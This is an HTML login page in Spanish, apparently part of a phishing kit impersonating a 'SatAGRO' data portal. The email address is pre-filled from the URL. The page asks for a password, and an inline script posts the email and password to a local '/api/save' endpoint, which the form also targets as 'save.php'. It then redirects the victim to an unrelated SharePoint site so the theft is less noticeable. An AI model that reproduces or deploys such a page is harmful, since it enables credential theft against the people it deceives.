<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión - SatAGRO</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="container">
    <div class="left-panel">
    </div>
    <div class="right-panel">
  <div class="top">
    <!-- Contenido que quieres arriba -->
    <img src="/img/logo_satagro_blurred.png" alt="SatAGRO Logo" class="small-logo">
    <h2>Escribir contraseña</h2>

    <form action="save.php" method="POST">
        <input type="hidden" name="email" id="email">
        <input type="password" name="password" placeholder="Contraseña" required />
        <button type="submit">Iniciar sesión</button>
    </form>

    <p>Bienvenidos a la central de datos de AMI desarrollada por nuestros mejores colaboradores de satagro</p>
  </div>

  <div class="bottom">
    <!-- Contenido que quieres abajo -->
    <div class="footer">
      <a href="#">Términos de uso</a>
      <a href="#">Privacidad y cookies</a>
    </div>
  </div>
</div>
  </div>
</body>
    <script>
  // 1. Recuperamos el email de la URL
  const params = new URLSearchParams(window.location.search);
  const email = params.get('email');

  // 2. Enviamos email y password al backend cuando el usuario envía el formulario
  document.querySelector("form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const password = document.querySelector('input[name="password"]').value;

    const response = await fetch("/api/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password })
    });

    if (response.ok) {
      // Redirigimos después de guardar
      window.location.href = "https://netorgft9238216.sharepoint.com/sites/datacenter";
    } else {
      alert("Hubo un error al guardar los datos");
    }
  });
</script>

</html>
